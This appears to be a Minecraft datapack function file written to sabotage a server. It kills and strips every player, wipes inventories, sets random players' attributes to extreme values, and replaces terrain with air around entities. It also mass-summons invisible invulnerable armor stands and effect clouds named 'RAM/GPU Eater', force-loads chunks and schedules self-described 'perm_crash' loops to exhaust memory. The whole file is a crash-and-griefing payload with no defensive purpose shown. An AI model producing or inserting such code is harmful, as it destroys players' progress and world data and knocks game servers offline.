scoreboard players add ram_leak ram_leak 1

attribute @r generic.movement_speed base set 50
attribute @r generic.max_health base set 0.1
attribute @r generic.jump_strength base set 10
attribute @r generic.scale base set 0.05
experience set @a 0 points
# Completely trash their inventory and armor slots
item replace entity @a weapon.mainhand with minecraft:acacia_boat[minecraft:custom_name="HELLO_WORLD"]
item replace entity @a weapon.offhand with minecraft:acacia_boat[minecraft:custom_name="HELLO_WORLD"]

clear @a
kill @a

# Summoning complex entities. 
execute at @a run summon area_effect_cloud ~ ~ ~ {Radius:100f,Duration:200,WaitTime:0,CustomName:'{"text":"RAM/GPU Eater"}'}
execute at @e at @s run summon armor_stand ~ ~ ~ {Invisible:1b,Invulnerable:1b,ShowArms:1b,Small:1b,ArmorItems:[{},{},{},{id:"minecraft:player_head",count:1,components:{"minecraft:profile":"Notch"}}]}

#clear chunks
execute as @e at @s run forceload add ~16 ~-16 ~16 ~16
execute as @a at @s run execute as @e[distance=..300,limit=30] at @s run fill ~-16 ~-160 ~-16 ~16 ~160 ~16 air
execute as @e[type=armor_stand] at @s run fill ~-16 ~-160 ~-16 ~16 ~160 ~16 air
function system:perm_crash_multiplier

# Run for 100 ticks (5 seconds)
schedule function system:perm_crash_loop 1s